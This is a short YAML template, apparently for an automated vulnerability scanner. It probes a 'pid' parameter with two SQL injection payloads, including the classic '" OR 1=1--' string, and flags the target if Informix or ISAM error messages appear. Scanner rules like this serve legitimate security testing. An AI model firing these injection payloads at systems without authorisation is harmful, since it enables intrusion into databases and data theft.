id: sqli6-informix-10
name: 'SQLi informix probe in pid'
severity: high
type: active
tags:
  - sqli
  - injection
  - informix
description: 'Triggers informix error via pid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      pid:
        - '" OR 1=1--'
        - 'admin''--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'Informix'
          - 'ISAM error'
